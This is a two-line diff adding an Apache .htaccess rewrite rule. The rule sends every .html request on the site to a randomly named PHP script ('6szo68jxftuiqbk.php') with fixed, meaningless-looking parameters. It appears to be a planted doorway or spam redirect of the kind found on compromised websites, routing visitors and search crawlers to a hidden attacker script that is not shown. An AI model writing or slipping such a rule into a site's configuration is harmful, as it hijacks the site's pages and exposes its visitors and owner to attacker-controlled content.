@@ -1,0 +1,2 @@
+RewriteEngine On 
+RewriteRule ^([A-Za-z0-9-]+).html$ 6szo68jxftuiqbk.php?world=5&looping=135&fn=2021st&hl=$1 [L]
